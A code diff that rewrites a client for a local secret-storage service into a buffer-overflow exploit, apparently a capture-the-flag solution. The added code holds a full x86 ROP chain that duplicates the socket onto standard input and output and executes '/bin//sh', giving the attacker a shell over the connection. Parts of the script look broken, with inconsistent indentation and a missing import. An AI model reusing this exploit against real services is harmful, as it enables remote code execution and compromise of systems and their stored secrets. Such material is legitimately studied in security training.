@@ -7,26 +7,76 @@ import time
 
 from console import console
 
-if len(sys.argv) != 2:
-    sys.exit("Usage: %s PORT" % sys.argv[0])
 
 def send_cmd(cmd):
-    port = int(sys.argv[1])
-    sock = socket.create_connection(('127.0.0.1', port),
+
+        port = int(sys.argv[1])
+        sock = socket.create_connection(('127.0.0.1', port),
                                     socket.getdefaulttimeout(),
                                     ('127.0.0.1', 0))
 
-    sock.sendall(cmd)
+        sock.sendall("a"*1020)
+        sock.sendall(cmd+"\r\n")
+    
+        while True:
+            console(sock)
+        sock.close()
 
-    while True:
-        buf = sock.recv(1024)
-        if not buf:
-            break
-        sys.stdout.write(buf)
-    sock.close()
 
-send_cmd("PUT SECRET p455w0rd! Secret value\r\n")
-send_cmd("GET SECRET password1\r\n")
-send_cmd("GET SECRET p455w0rd!\r\n")
+    
+p = ''
 
-# :vim set sw=4 ts=8 sts=8 expandtab:
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += pack('<I', 0x00000000) # @ .data
+p += pack('<I', 0x080aeca3) # add eax, edx ; ret
+p += pack('<I', 0x080481e1) # pop ebx ; ret
+p += pack('<I', 0x00000000) # @ .data
+p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
+
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += pack('<I', 0x0000003f) # 0x3f
+p += pack('<I', 0x0812b35b) # pop ecx ; ret
+p += pack('<I', 0x00000000) # 0
+p += pack('<I', 0x08085cbf) # int 0x80
+
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += pack('<I', 0x0000003f) # 0x3f
+p += pack('<I', 0x0812b35b) # pop ecx ; ret
+p += pack('<I', 0x00000001) # 1
+p += pack('<I', 0x08085cbf) # int 0x80
+
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += pack('<I', 0x0000003f) # 0x3f
+p += pack('<I', 0x0812b35b) # pop ecx ; ret
+p += pack('<I', 0x00000002) # 2
+p += pack('<I', 0x08085cbf) # int 0x80
+
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139060) # @ .data
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += '/bin'
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139064) # @ .data + 4
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += '//sh'
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080481e1) # pop ebx ; ret
+p += pack('<I', 0x08139060) # @ .data
+p += pack('<I', 0x0812b35b) # pop ecx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += pack('<I', 0x0000000b) # 11
+p += pack('<I', 0x08074ded) # int 0x80
+
+c = 'w'
+i = 32
+send_cmd(c*i+p)
+
